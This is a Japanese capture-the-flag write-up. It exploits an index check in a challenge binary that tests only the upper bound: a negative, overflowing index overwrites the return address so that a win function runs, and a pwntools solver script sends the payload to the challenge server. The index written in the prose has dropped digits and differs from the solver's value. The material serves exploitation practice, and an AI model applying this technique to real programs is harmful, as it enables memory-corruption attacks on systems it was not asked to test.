# Bounds Checking

## / Overview

Out-of-Bounds Write

## / Writeup

`index`と`value`を入力として`array[index] = value`を書き込むことが出来ます．`array`の要素数は`0x100`ですがこれを超える`index`の指定は禁止されています．

```c
if (index >= 0x100) {
    puts("Too large index.");
    exit(1);
}
```

この様に正の値だけをチェックしている場合，GOT Overwriteの可能性もあります．`checksec`でセキュリティレベルを確かめます．

```sh
$ checksec ./chal
[*] '/home/wsl1/ctf/bounds-checking/chal'
    Arch:       amd64-64-little
    RELRO:      Partial RELRO
    Stack:      Canary found
    NX:         NX enabled
    PIE:        No PIE (0x400000)
    SHSTK:      Enabled
    IBT:        Enabled
    Stripped:   No
```

`RELRO`が`Partial RELRO`なので書き換えは可能です．次に`main`関数を逆アセンブルしてみます．

```nasm
(gdb) disas main
Dump of assembler code for function main:
   0x000000000040129b <+0>:     endbr64
   0x000000000040129f <+4>:     push   rbp
   0x00000000004012a0 <+5>:     mov    rbp,rsp
=> 0x00000000004012a3 <+8>:     sub    rsp,0x820
    // --snip--
   0x0000000000401395 <+250>:   mov    rax,QWORD PTR [rbp-0x820]
   0x000000000040139c <+257>:   mov    rdx,QWORD PTR [rbp-0x818]
   0x00000000004013a3 <+264>:   mov    QWORD PTR [rbp+rax*8-0x810],rdx
   0x00000000004013ab <+272>:   mov    eax,0x0
   0x00000000004013b0 <+277>:   mov    rdx,QWORD PTR [rbp-0x8]
   0x00000000004013b4 <+281>:   sub    rdx,QWORD PTR fs:0x28
   0x00000000004013bd <+290>:   je     0x4013c4 <main+297>
   0x00000000004013bf <+292>:   call   0x4010e0 <__stack_chk_fail@plt>
   0x00000000004013c4 <+297>:   leave
   0x00000000004013c5 <+298>:   ret
```

アセンブリコードを読み解くと`rax`には`index`の値を，`rdx`には`value`の値が入ります．`<+264>`で`array[index] = value`が行われています．GOT Overwriteならその後に続く関数を`win`のアドレスに書き換えますが，`__stack_chk_fail`しかありません．これを書き換えても，カナリアが破壊されない限り呼び出されません．つまりGOT Overwriteではなさそうです．

次に整数のオーバーフローを使ってリターンアドレス（`rbp+8`）の書き換えを狙ってみます．書き込み先のアドレスが`[rbp+rax*8-0x810]`で計算されているなら`index*8`が64ビットを超えたらオーバーフローを起こします．しかも`index`のMSBが`1`であれば符号付き整数なので負の数として認識されるため，チェックを通過できます．

つまり`index=0x800000000000 + 0x103`とすればオーバーフローによって`rax*8-0x810=0x8`になります．あとは`value=(winのアドレス)`とすればリターンアドレスが`win`のアドレスに書き換えられて，`win`が実行されます．

## / Solver

```py
from pwn import *

elf = ELF('./chal')
win_addr = elf.symbols['win'] # no-pieなので固定

print(f'win: {hex(win_addr)}')

index = 0x8000_0000_0000_0000 + 0x818 // 8
index = -(0x1_0000_0000_0000_0000 - index)

print(f'index: {hex(index)}')

p = remote('34.170.146.252', 22958)
    
p.sendlineafter('index:', str(index).encode())
p.sendlineafter('value:', str(win_addr).encode())

p.recvall().decode()
```